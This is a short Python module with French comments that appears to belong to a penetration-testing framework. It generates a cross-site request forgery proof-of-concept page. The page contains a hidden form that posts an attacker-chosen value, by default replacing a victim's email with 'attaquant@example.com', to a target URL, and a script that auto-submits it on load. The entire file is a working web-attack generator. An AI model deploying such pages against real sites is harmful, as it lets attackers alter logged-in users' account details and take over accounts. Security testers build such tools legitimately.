from base_module import BaseModule

class Module(BaseModule):
  def run(self, context):
    try:
      # Récupérer l'URL du contexte
      vulnerable_url = context.get('target')

      if not vulnerable_url:
          raise ValueError("URL manquante dans le contexte pour générer le POC CSRF.")

      attack_parameter = context.get('attack_parameter', 'email')
      attack_value = context.get('attack_value', 'attaquant@example.com')

      if not all([vulnerable_url, attack_parameter, attack_value]):
          raise ValueError("Informations manquantes dans le contexte pour générer le POC CSRF.")

      poc_html = f"""
      <html>
      <body>
        <h1>CSRF attack</h1>
        <p>If you are logged in to the target application, this page will attempt to modify your information.</p>
        <form action="{vulnerable_url}" method="POST">
          <input type="hidden" name="{attack_parameter}" value="{attack_value}">
          <input type="submit" value="Soumettre">
        </form>
        <script>
          document.forms[0].submit();
        </script>
      </body>
      </html>
      """

      context['poc_html'] = poc_html
      return context

    except Exception as e:
        context.setdefault('errors', []).append(f"Erreur dans generate_csrf_poc : {e}")
        return context
